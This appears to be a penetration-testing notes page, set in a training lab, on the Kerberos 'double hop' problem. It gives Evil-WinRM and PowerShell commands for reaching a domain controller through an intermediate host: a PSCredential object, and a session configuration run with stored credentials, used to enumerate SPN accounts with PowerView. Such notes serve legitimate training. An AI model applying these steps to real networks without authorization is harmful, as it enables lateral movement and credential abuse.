# Double Hop Problem

Let's say we have three hosts: `Attack host` --> `DEV01` --> `DC01`. Our Attack Host is a Parrot box within the corporate network but not joined to the domain. We obtain a set of credentials for a domain user and find that they are part of the Remote Management Users group on DEV01. We want to use PowerView to enumerate the domain, which requires communication with the Domain Controller, DC01. If we connect to Dev01 with WinRM, load PowerView and try to enumerate DC01, we will get an error. Not because we don’t have the rights, but because our credentials are not stored in memory

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F00neYVtcAOCYsWcWnsgM%2Fimage.png?alt=media&#x26;token=82ce6911-4868-4bd9-aaf0-9553a38d215f" alt=""><figcaption></figcaption></figure>

### For Linux - Evil WinRM

```ps1
# Try to use PowerView module while connected through WinRM => error
*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"
At C:\\Users\\backupadm\\Documents\\PowerView.ps1:5253 char:20
+             else { $Results = $UserSearcher.FindAll() }
+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : DirectoryServicesCOMException
    
# Checking with klist, we see that we only have one cached ticket for our current server
*Evil-WinRM* PS C:\\Users\\backupadm\\Documents> klist

Current LogonId is 0:0x57f8a

Cached Tickets: (1)

#0> Client: backupadm @ INLANEFREIGHT.LOCAL
    Server: academy-aen-ms0$ @
    KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
    Ticket Flags 0xa10000 -> renewable pre_authent name_canonicalize
    Start Time: 6/28/2022 7:31:53 (local)
    End Time:   6/28/2022 7:46:53 (local)
    Renew Time: 7/5/2022 7:31:18 (local)
    Session Key Type: AES-256-CTS-HMAC-SHA1-96
    Cache Flags: 0x4 -> S4U
    Kdc Called: DC01.INLANEFREIGHT.LOCAL
    
# Set up PScredential object
$SecPassword = ConvertTo-SecureString '<PASS>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('<DOMAIN>\<USER>', $SecPassword)
 
# Run the commands with the PScredential object
get-domainuser -spn -credential $Cred | select samaccountname
```

### For Windows - PSSession

```powershell
# WinRM from a windows host to the target
Enter-PSSession -ComputerName <COMPUTER_NAME> -Credential <DOMAIN>\<USER>

# Work around the issue with the Register-PSSessionConfiguration cmdlet
Register-PSSessionConfiguration -Name <ARBITRARY_SESSION_NAME> -RunAsCredential <DOMAIN>\\<USER>

# Restart WinRM service from our current PSSession session
Restart-Service WinRM

# Connect again, passing the session name
Enter-PSSession -ComputerName <COMPUTER_NAME> -Credential <DOMAIN>\<USER> -ConfigurationName <ARBITRARY_SESSION_NAME>

# Run the command again 
Import-Module .\PowerView.ps1
get-domainuser -spn | select samaccountname
```
